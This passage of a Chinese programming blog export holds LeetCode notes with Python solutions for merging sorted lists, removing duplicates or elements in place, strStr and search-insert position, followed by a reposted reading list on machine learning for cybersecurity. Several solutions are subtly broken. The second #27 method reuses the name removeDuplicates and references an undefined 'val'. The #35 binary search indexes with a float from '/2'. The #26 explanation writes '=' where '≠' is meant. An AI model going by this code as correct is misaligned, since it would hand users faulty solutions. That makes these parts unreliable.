<p>首先，我们设定一个哨兵节点 <code>prehead</code> ，这可以在最后让我们比较容易地返回合并后的链表。我们维护一个 <code>prev</code> 指针，我们需要做的是调整它的 <code>next</code> 指针。然后，我们重复以下过程，直到 <code>l1</code> 或者<code>l2</code>指向了 <code>null </code>：如果 <code>l1</code> 当前位置的值小于等于 <code>l2</code> ，我们就把<code> l1</code> 的值接在 <code>prev</code> 节点的后面同时将 <code>l1</code> 指针往后移一个。否则，我们对 <code>l2</code> 做同样的操作。不管我们将哪一个元素接在了后面，我们都把<code>prev</code> 向后移一个元素。</p>
<p>在循环终止的时候，<code> l1</code> 和 <code>l2</code> 至多有一个是非空的。由于输入的两个链表都是有序的，所以不管哪个链表是非空的，它包含的所有元素都比前面已经合并链表中的所有元素都要大。这意味着我们只需要简单地将非空链表接在合并链表的后面，并返回合并链表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span>(<span class="params">self, l1, l2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        prehead = ListNode(<span class="number">-1</span>)</span><br><span class="line">        </span><br><span class="line">        prev = prehead</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">and</span> l2:</span><br><span class="line">            <span class="keyword">if</span> l1.val &lt;= l2.val:</span><br><span class="line">                prev.next = l1</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                prev.next = l2</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            prev = prev.next</span><br><span class="line">        </span><br><span class="line">        prev.next = l1 <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> l2</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> prehead.next</span><br></pre></td></tr></table></figure>
<h3 id="Extra-v5">Extra</h3>
<ol>
<li>
<p>连接两个列表：<code>list1 + list2</code></p>
</li>
<li>
<p><code>sort()</code>和<code>sorted()</code>的区别</p>
<ul>
<li>
<p>sort是容器的函数：<code>sort(cmp=None, key=None, reverse=False)</code></p>
<p>sorted是python的内建函数：<code>sorted(iterable, cmp=None, key=None, reverse=False)</code></p>
<p>即：<strong>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</strong></p>
</li>
<li>
<p>对于一个无序的列表a，调用a.sort()，对a进行排序后返回a，sort()函数修改待排序的列表内容。</p>
<p>而对于同样一个无序的列表a，调用sorted(a)，对a进行排序后返回一个新的列表，而对a不产生影响。</p>
</li>
<li>
<p>key：用来指定一个函数，此函数在每次元素比较时被调用，此函数代表排序的规则，也就是你按照什么规则对你的序列进行排序；</p>
<p>reverse：是用来表明是否逆序，默认的False情况下是按照升序的规则进行排序的，当reverse=True时，便会按照降序进行排序。</p>
</li>
</ul>
</li>
</ol>
<h2 id="26-remove-duplicates-from-sorted-array">#26_remove-duplicates-from-sorted-array</h2>
<h3 id="Question-v8">Question</h3>
<p>给定一个排序数组，你需要在原地删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。</p>
<blockquote>
<p>为什么返回数值是整数，但输出的答案是数组呢?</p>
<p>请注意，输入数组是以“引用”方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。</p>
<p>你可以想象内部操作如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; nums 是以“引用”方式传递的。也就是说，不对实参做任何拷贝</span><br><span class="line">int len &#x3D; removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在函数里修改输入数组对于调用者是可见的。</span><br><span class="line">&#x2F;&#x2F; 根据你的函数返回的长度, 它会打印出数组中该长度范围内的所有元素。</span><br><span class="line">for (int i &#x3D; 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="Example-v8">Example</h3>
<p><strong>示例1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定数组 nums &#x3D; [1,1,2], </span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。 </span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br><span class="line"></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;remove-duplicates-from-sorted-array</span><br><span class="line">著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>
<p><strong>示例2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 nums &#x3D; [0,0,1,1,1,2,2,3,3,4],</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v7">Solution</h3>
<p><strong>思路</strong></p>
<p>我们可以放置两个指针<code>i</code>和<code>j</code>，其中<code>i</code>是慢指针，而<code>j</code>是快指针。只要 <code>nums[i] = nums[j]</code>，我们就增加<code>j</code>以跳过重复项。</p>
<p>当我们遇到<code>nums[i] = nums[j]</code>时，跳过重复项的运行已经结束，因此我们必须把它<code>nums[j]</code>的值复制到 <code>nums[i + 1]</code>。然后递增<code>i</code>，接着我们将再次重复相同的过程，直到<code>j</code>到达数组的末尾为止。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, len(nums)):</span><br><span class="line">        	<span class="keyword">if</span> nums[i] != nums[j]:</span><br><span class="line">        		i = i+<span class="number">1</span></span><br><span class="line">        		nums[i] = nums[j]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> i+<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="27-remove-element">#27_remove-element</h2>
<h3 id="Question-v9">Question</h3>
<p>给定一个数组 nums 和一个值 val，你需要原地移除所有数值等于 val 的元素，返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。</p>
<p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。</p>
<h3 id="Example-v9">Example</h3>
<p><strong>示例一</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">给定 nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>], val = <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">2</span>, 并且 nums 中的前两个元素均为 <span class="number">2</span>。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>
<p><strong>示例二</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">给定 nums = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">2</span>], val = <span class="number">2</span>,</span><br><span class="line"></span><br><span class="line">函数应该返回新的长度 <span class="number">5</span>, 并且 nums 中的前五个元素为 <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>。</span><br><span class="line"></span><br><span class="line">注意这五个元素可为任意顺序。</span><br><span class="line"></span><br><span class="line">你不需要考虑数组中超出新长度后面的元素。</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v8">Solution</h3>
<h4 id="方法一-v7">方法一</h4>
<p><strong>思路</strong></p>
<ol>
<li>首先遍历循环<code>nums</code>，并使用<code>count</code>来计数有多少个待删除的元素；</li>
<li>再执行<code>count</code>次<code>remove</code>函数删除<code>nums</code>中值为<code>val</code>的元素</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span>(<span class="params">self, nums: List[int], val: int</span>) -&gt; int:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] == val:</span><br><span class="line">                count = count+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(count):</span><br><span class="line">            nums.remove(val)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> len(nums)</span><br></pre></td></tr></table></figure>
<h4 id="方法二-v7">方法二</h4>
<p><strong>思路</strong></p>
<blockquote>
<p>这道题的思路和 <a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array/solution/shan-chu-pai-xu-shu-zu-zhong-de-zhong-fu-xiang-by-/">删除排序数组中的重复项</a>解法类似</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        	<span class="keyword">if</span> nums[j] != val:</span><br><span class="line">        		nums[i] = nums[j]</span><br><span class="line">                i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure>
<h2 id="28-implement-strstr">#28_implement-strstr</h2>
<h3 id="Question-v10">Question</h3>
<p>实现 <code>strStr()</code> 函数。</p>
<p>给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回  -1。</p>
<blockquote>
<p>说明:</p>
<p>当 needle 是空字符串时，我们应当返回什么值呢？这是一个在面试中很好的问题。</p>
<p>对于本题而言，当 needle 是空字符串时我们应当返回 0 。这与C语言的 strstr() 以及 Java的 indexOf() 定义相符。</p>
</blockquote>
<h3 id="Example-v10">Example</h3>
<p><strong>示例一</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: haystack &#x3D; &quot;hello&quot;, needle &#x3D; &quot;ll&quot;</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<p><strong>示例二</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: haystack &#x3D; &quot;aaaaa&quot;, needle &#x3D; &quot;bba&quot;</span><br><span class="line">输出: -1</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v9">Solution</h3>
<h4 id="方法一-v8">方法一</h4>
<p><strong>思路</strong></p>
<ol>
<li>若<code>needle</code>为空字符串，则返回0；</li>
<li>若<code>needle</code>的首字符不在<code>haystack</code>中，则返回-1；</li>
<li>循环遍历<code>haystack</code>，找到<code>needle</code>首字符在<code>haystack</code>的起始位置，向后比较<code>needle_len</code>长度的子字符串。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strStr</span>(<span class="params">self, haystack: str, needle: str</span>) -&gt; int:</span></span><br><span class="line">        needle_len = len(needle)</span><br><span class="line">        <span class="keyword">if</span> needle_len == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        char = needle[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> haystack:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(haystack)):</span><br><span class="line">                <span class="keyword">if</span> char == haystack[i]:</span><br><span class="line">                    <span class="keyword">if</span> haystack[i:(i+needle_len)] == needle:</span><br><span class="line">                        <span class="keyword">return</span> i             </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
<h4 id="方法二-v8">方法二</h4>
<p><strong>思路</strong></p>
<p>和方法一的思路相似，只是代码写的更为简洁，但是感觉更为暴力。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strStr</span>(<span class="params">self, haystack: str, needle: str</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(haystack) - len(needle)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> haystack[i:i+len(needle)] == needle:</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
<h2 id="35-search-insert-position">#35_search_insert_position</h2>
<h3 id="Question-v11">Question</h3>
<p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
<p>你可以假设数组中无重复元素。</p>
<h3 id="Example-v11">Example</h3>
<p><strong>示例一</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,5,6], 5</span><br><span class="line">输出: 2</span><br></pre></td></tr></table></figure>
<p><strong>示例二</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,5,6], 2</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
<p><strong>示例三</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1,3,5,6], 7</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>
<h3 id="Solution-v10">Solution</h3>
<h4 id="方法一-v9">方法一</h4>
<p><strong>思路</strong></p>
<ol>
<li>如果<code>target</code>在<code>nums</code>中，则直接返回索引；</li>
<li>否则将<code>target</code>添加在<code>nums</code>列表后面，再对其进行排序，最后返回索引。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span>(<span class="params">self, nums: List[int], target: int</span>) -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">return</span> nums.index(target)</span><br><span class="line">        nums.append(target)</span><br><span class="line">        nums.sort()</span><br><span class="line">        <span class="keyword">return</span> nums.index(target)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这种方法其实比较取巧，而题目的意图是想要考察二分查找。</p>
</blockquote>
<h4 id="方法二-v9">方法二</h4>
<p><strong>思路</strong></p>
<p>二分法查找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span>(<span class="params">self, nums: List[int], target: int</span>) -&gt; int:</span></span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        high = len(nums)</span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = low + (high - low)/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] &gt; target:</span><br><span class="line">                high = mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">                low = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">return</span> low</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习与网络安全相关的资料（转）</title>
    <url>/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89/</url>
    <content><![CDATA[<h1 id="机器学习与网络安全相关的资料（转）">机器学习与网络安全相关的资料（转）</h1>
<p>外媒 KDnuggets 刊登了一篇机器学习与网络安全相关的资料大汇总，文中列出了相关数据源的获取途径，优秀的论文和书籍，以及丰富的教程。大部分都是作者在日常工作和学习中亲自使用并认为值得安利的纯干货。</p>
<h2 id="数据源">数据源</h2>
<p><a href="http://www.secrepo.com/">SecRepo.com</a> 网站，该网站汇聚了大量的与机器学习和网络安全相关的数据源，并提供免费下载。据网站首页介绍，所有可用的数据源包含两个部分：一是网站方面自己整理的，二是来自第三方的。其内容包括互联网扫描数据，恶意软件源码，以及和网络安全相关的系统日志等。</p>
<h2 id="论文">论文</h2>
<p><a href="https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/melicher"><strong>1. Fast, Lean, and Accurate: Modeling Password Guessability Using Neural Networks</strong></a></p>
<p>本文来自卡内基梅隆大学，分析了通用符号密码的脆弱性，以及目前常见的密码健壮性检验的各种缺点，甚至给出了他们在实验室利用神经网络算法攻破各种符号密码的具体步骤，非常强大。</p>
<p><a href="http://ieeexplore.ieee.org/document/5504793/"><strong>2. Outside the Closed World: On Using Machine Learning for Network Intrusion Detection</strong></a></p>
<p>本文来自加州伯克利大学，分析了利用机器学习探测网络安全的优势和劣势，并给出了一些改善这些劣势的解决方案。</p>
<p><a href="https://link.springer.com/chapter/10.1007/978-3-540-30143-1_11"><strong>3. Anomalous Payload-Based Network Intrusion Detection</strong></a></p>
<p>通常一个互联网上的恶意请求都会在真正的恶意代码外部包装一层善意的外衣，这大大阻碍了相关探测程序的正常工作。来自哥伦比亚大学的Ke Wang和Salvatore J. Stolfo两位学者在本文中给出了一种全新的探测恶意代码中有效代码段的方法，并在实测中达到了接近100%正确率和0.1%的误报率。</p>
<p><a href="https://dl.acm.org/citation.cfm?id=2420987"><strong>4. Malicious PDF detection using metadata and structural features</strong></a></p>
<p>当前，随着防范措施的升级，恶意代码隐藏在PDF和Word等文本文件中的例子屡见不鲜，用户防不胜防。在本文中，来自乔治梅森大学的学者介绍了一种通过机器学习技术探测恶意文本文件的技术，特别是内含恶意代码的PDF文件。</p>
<p><a href="https://dl.acm.org/citation.cfm?id=2339697"><strong>5. Adversarial support vector machine learning</strong></a></p>
<p>来自德州大学，介绍了两种利用机器学习技术探测网络恶意攻击的分析模型，即无边界攻击模型（free-range attack model）和限制边界攻击模型（restrained attack model）。</p>
<p><a href="https://dl.acm.org/citation.cfm?id=1387709.1387716"><strong>6. Exploiting machine learning to subvert your spam filter</strong></a></p>
<p>垃圾邮件过滤系统不算什么高新技术，但如何提升过滤的准确性一直是一个难题。本文中来自加州伯克利大学的学者们介绍了一种基于机器学习开发的垃圾邮件过滤器，为垃圾邮件的过滤提供了一种全新的实现思路。</p>
<p>以下论文来自 <a href="http://covert.io/">covert.io</a> 网站，该网站的论文（或博客）数量庞大，但并不像上文提到的那些论文一样全部来自美国高校，<a href="http://covert.io">covert.io</a> 的文章也来自各大科技公司和研究所。</p>
<p>[<strong>7. CAMP: Content-Agnostic Malware Protection</strong>](<a href="http://www.covert.io/research-papers/security/CAMP">http://www.covert.io/research-papers/security/CAMP</a> - Content Agnostic Malware Protection.pdf)</p>
<p>来自谷歌，介绍了一种名为CAMP的恶意软件保护系统，该系统能够通过对二进制可执行文件的探测，确保互联网的软件应用安全。</p>
<p><strong>[8. Building a Dynamic Reputation System for DNS](<a href="http://www.covert.io/research-papers/security/Notos">http://www.covert.io/research-papers/security/Notos</a> - Building a dynamic reputation system for dns.pdf)</strong></p>
<p>DNS服务器一直是互联网中非常重要的组成部分，针对目前越来越流行的DNS攻击，来自乔治亚理工学院的学者介绍了一种名为Notos的动态的域名信誉系统，可以有效防范各种针对DNS服务器的匿名的网络黑客攻击。</p>
<p>[<strong>9. Detecting malware domains at the upper dns hierarchy</strong>](<a href="http://www.covert.io/research-papers/security/Kopis">http://www.covert.io/research-papers/security/Kopis</a> - Detecting malware domains at the upper dns hierarchy.pdf)</p>
<p>本文介绍了一种名为Kopis的新型域名检测系统，可以有效探测互联网上包含恶意攻击代码的域名，由网络安全公司Damballa、乔治亚理工学院和乔治亚大学联合研发。</p>
<p>[<strong>10. From Throw-away Traffic To Bots – Detecting The Rise Of DGA-based Malware</strong>](<a href="http://www.covert.io/research-papers/security/From">http://www.covert.io/research-papers/security/From</a> throw-away traffic to bots - detecting the rise of dga-based malware.pdf)</p>
<p>本文同样来自Damballa公司和乔治亚大学，介绍了一种针对僵尸网络的新技术，该技术够探测来自动态域名系统的恶意攻击，整合了聚合和分类两类算法。</p>
<p><strong>[11. EXPOSURE: Finding Malicious Domains Using Passive DNS Analysis](<a href="http://www.covert.io/research-papers/security/Exposure">http://www.covert.io/research-papers/security/Exposure</a> - Finding malicious domains using passive dns analysis.pdf)</strong></p>
<p>DNS服务器成为了越来越多黑客的攻击对象，本文介绍了一种名为EXPOSURE的域名分析系统，可以针对大批量的域名恶意访问进行探测，由Eurecom研究所、波士顿东北大学和加州大学共同研发。</p>
<p>[<strong>12. Polonium: Tera-Scale Graph Mining for Malware Detection</strong>](<a href="http://www.covert.io/research-papers/security/Polonium">http://www.covert.io/research-papers/security/Polonium</a> - Tera-Scale Graph Mining for Malware Detection.pdf)</p>
<p>本文来自网络安全公司Symantec、卡内基梅隆大学，介绍了一个名为Polonium的高效的可扩展的恶意软件探测系统。</p>
<p>[<strong>13. Nazca: Detecting Malware Distribution in Large-Scale Networks</strong>](<a href="http://www.covert.io/research-papers/security/Nazca">http://www.covert.io/research-papers/security/Nazca</a> -  Detecting Malware Distribution in Large-Scale Networks.pdf)</p>
<p>大量用户在现实生活中下载并安装恶意软件的行为通常包含一定的规律性。来自加州大学圣巴巴拉分校、Narus公司的学者们将这些无人问津的数据利用起来，提出了一个名为Nazca的网络安全探测系统。</p>
<p>[<strong>14. Anagram: A Content Anomaly Detector Resistant to Mimicry Attack</strong>](<a href="http://www.covert.io/research-papers/security/Anagram">http://www.covert.io/research-papers/security/Anagram</a> - A Content Anomaly Detector Resistant to Mimicry Attack.pdf)</p>
<p>来自哥伦比亚大学，介绍了一个名为Anagram的异常数据报文探测器。</p>
<h2 id="书籍">书籍</h2>
<p>讲述数据科学和机器学习在网络安全领域的应用的书籍并不多，作者只介绍了以下两本。</p>
<p><strong><a href="https://www.amazon.cn/Data-Mining-and-Machine-Learning-in-Cybersecurity-Dua-Sumeet/dp/B00BU1CDFI/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1483425388&amp;sr=1-1&amp;keywords=Data+Mining+and+Machine+Learning+in+Cybersecurity">1. Data Mining and Machine Learning in Cybersecurity</a></strong></p>
<p>作者是来自路易斯安那理工大学的Sumeet Dua博士和Xian Du博士，探讨了目前普遍存在的网络安全问题以及最先进的机器学习和数据挖掘解决方案。</p>
<p><a href="https://www.amazon.cn/Machine-Learning-and-Data-Mining-for-Computer-Security-Methods-and-Applications/dp/184628029X"><strong>2. Machine Learning and Data Mining for Computer Security</strong></a></p>
<p>编者是来自乔治城大学的Marcus A. Maloof，该书系统介绍了数据挖掘和机器学习技术在计算机安全领域的最新研究成果。</p>
<p><em>目前两本书都没有中文版，纸质版在亚马逊上的售价都超过1000人民币，第一本有Kindle电子版。</em></p>
<h2 id="演讲">演讲</h2>
<p>原文作者收集了如下一些关于机器学习和网络安全的演讲，演讲者们要么是来自相关领域的公司副总、技术负责人，要么是各大高校的研究人员、博士或者教授。</p>
<p><a href="https://www.youtube.com/watch?v=tukidI5vuBs"><strong>1. Using Machine Learning to Support Information Security</strong></a></p>
<p>视频系统介绍了机器学习在信息安全领域的应用，时长约1小时。</p>
<p><strong><a href="https://www.youtube.com/watch?v=36IT9VgGr0g">2. Defending Networks with Incomplete Information</a></strong></p>
<p>要在限定的时间内（通常是24小时）对恶意攻击做出反应通常需要耗费巨大的人力和物力，但是如果利用机器学习的方法，首先对网络攻击进行优先级和攻击方式分类，甚至处理一些简单的套路式的攻击，则可以大大降低网络安全工程师的工作强度。本视频就介绍了这一思路的具体应用，时长约47分钟。</p>
<p><a href="https://www.youtube.com/watch?v=vy-jpFpm1AU"><strong>3. Applying Machine Learning to Network Security Monitoring</strong></a></p>
<p>这个视频介绍了如何将机器学习应用于网络安全探测，时长约1小时。</p>
<p><strong><a href="https://www.youtube.com/watch?v=yG6QlHOAWiE">4. Measuring the IQ of your Threat Intelligence Feed</a></strong></p>
<p>目前互联网上存在着各种各样的网络安全的探测系统，但是用户对它们褒贬不一，究竟如何判断一个探测系统的可靠性，视频介绍了一种实用的判断方法，时长约40分钟。</p>
<p><a href="https://www.youtube.com/watch?v=6JMEKnes-w0"><strong>5. Data-Driven Threat Intelligence: Metrics On Indicator Dissemination And Sharing</strong></a></p>
<p>视频介绍了数据驱动下的安全情报分析，特别是和社交网络分享和传播相关的，时长约48分钟。</p>
<p><strong><a href="https://www.youtube.com/watch?v=dGwH7m4N8DE">6. Applied Machine Learning for Data Exfil and Other Fun Topics</a></strong></p>
<p>为了帮助网络安全相关的研究者、分析师和极客爱好者了解机器学习，以及如何将机器学习应用在网络安全中领域中，例如数据泄露，本视频做了详细介绍，时长约43分钟。</p>
<p><a href="https://www.youtube.com/watch?v=TYVCVzEJhhQ"><strong>7. Secure Because Math: A Deep-Dive on ML-Based Monitoring</strong></a></p>
<p>视频介绍了以机器学习技术为基础的互联网监控，时长约46分钟。</p>
<p><a href="https://www.youtube.com/watch?v=JAGDpJFFM2A"><strong>8. Machine Duping 101: Pwning Deep Learning Systems</strong></a></p>
<p>44分钟教你攻克一个深度学习系统，必看系列。</p>
<p><a href="https://www.youtube.com/watch?v=l7U0pDcsKLg"><strong>9. Weaponizing Data Science for Social Engineering</strong></a></p>
<p>视频介绍了社交网络中的恶意攻击行为和数据科学对此可能发挥的作用，时长约44分钟。</p>
<p><strong><a href="https://www.youtube.com/watch?v=oiuS1DyFNd8">10. Defeating Machine Learning What Your Security Vendor Is Not Telling You</a></strong></p>
<p>还是关于攻破机器学习的话题，视频介绍了如何攻破以机器学习为基础的互联网安全产品，时长约50分钟。</p>
<p><a href="https://www.youtube.com/watch?v=u6a7afsD39A"><strong>11. CrowdSource: Crowd Trained Machine Learning Model for Malware Capability Det</strong></a></p>
<p>视频介绍了如何利用机器学习模型来探测互联网安全，时长约28分钟。</p>
<p><strong><a href="https://www.youtube.com/watch?v=sPtbDUJjhbk">12. Defeating Machine Learning: Systemic Deficiencies for Detecting Malware</a></strong></p>
<p>系统的“缺陷”也能用来探测恶意软件？这个视频用45分钟为你详细讲解利用机器学习和系统“缺陷”来探测恶意软件的方法。</p>
<p><a href="https://www.youtube.com/watch?v=2cQRSPFSY-s"><strong>13. Packet Capture Village – Theodora Titonis – How Machine Learning Finds Malware</strong></a></p>
<p>视频介绍了如何利用机器学习探测移动端恶意软件，时长约44分钟。</p>
<p><strong><a href="https://www.youtube.com/watch?v=iLNHVwSu9EA&amp;t=245s">14. Build an Antivirus in 5 Min – Fresh Machine Learning</a></strong></p>
<p>视频用5分钟介绍了如何用互联网上开源的机器学习框架编写一个全新的防病毒程序。</p>
<p><a href="https://www.youtube.com/watch?v=zT-4zdtvR30"><strong>15. Hunting for Malware with Machine Learning</strong></a></p>
<p>视频介绍了针对企业用户的自动化恶意软件探测系统，时长约48分钟。</p>
<h2 id="项目和教程">项目和教程</h2>
<p><a href="https://clicksecurity.github.io/data_hacking/"><strong>1. Click Security Data Hacking Project</strong></a></p>
<p>该项目包含了一系列与IPython、Pandas、Scikit Learn相关的练习，包含笔记和原代码，每个练习都会故意设置一些常见的代码错误、数据库错误和逻辑错误供使用者改正。该系列教程几乎是机器学习在信息安全领域应用的必学教程。</p>
